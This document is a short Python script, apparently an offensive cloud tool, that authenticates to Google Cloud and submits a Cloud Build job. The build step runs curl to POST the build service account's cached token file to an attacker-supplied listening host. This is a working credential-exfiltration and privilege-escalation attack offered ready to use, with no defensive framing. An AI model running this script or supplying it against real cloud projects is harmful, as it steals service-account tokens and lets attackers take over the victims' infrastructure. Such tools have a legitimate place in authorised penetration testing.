#!/usr/bin/env python3

PROJECT_ID = ''

import argparse
import google.oauth2.credentials
from google.oauth2 import service_account
from googleapiclient import discovery


def main(args):
    if args.service_account_credential_file_path:
        credentials = service_account.Credentials.from_service_account_file(args.service_account_credential_file_path)
        cb = discovery.build('cloudbuild', 'v1', credentials=credentials)
    else:
        use_access_token = input('No credential file passed in, enter an access token to authenticate? (y/n) ')
        if use_access_token.rstrip().lower() == 'y':
            access_token = input('Enter an access token to use for authentication: ')
            credentials = google.oauth2.credentials.Credentials(access_token.rstrip())
            cb = discovery.build('cloudbuild', 'v1', credentials=credentials)
        else:
            default = input('No credential file passed in and no access token entered, use the application-default credentials? (y/n) ')
            if default.rstrip().lower() == 'y':
                cb = discovery.build('cloudbuild', 'v1')
            else:
                print('\nNo authentication method selected.')
                return

    build_body = {
        'steps': [
            {
                'name': 'python',
                'entrypoint': 'python',
                'args': [
                    '-c',
                    f'import os;os.system("curl -d @/root/tokencache/gsutil_token_cache {args.listening_host}")'
                ]
            }
        ]
    }
    response = cb.projects().builds().create(projectId=PROJECT_ID, body=build_body).execute()
    print(response)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-l', '--listening-host', required=True, help='The full URL of an HTTP(S) server where the Cloud Build Service Account can be POSTed. Example: https://myserver.tld/token')
    parser.add_argument('-f', '--service-account-credential-file-path', required=False, default=None, help='The path to the JSON file that contains the private key for a GCP Service Account. By default, you will be prompted for a user access token, then if you decline to enter one it will prompt you to default to the default system credentials. More information here: https://google-auth.readthedocs.io/en/latest/user-guide.html#service-account-private-key-files and here: https://google-auth.readthedocs.io/en/latest/user-guide.html#user-credentials')

    args = parser.parse_args()

    main(args)
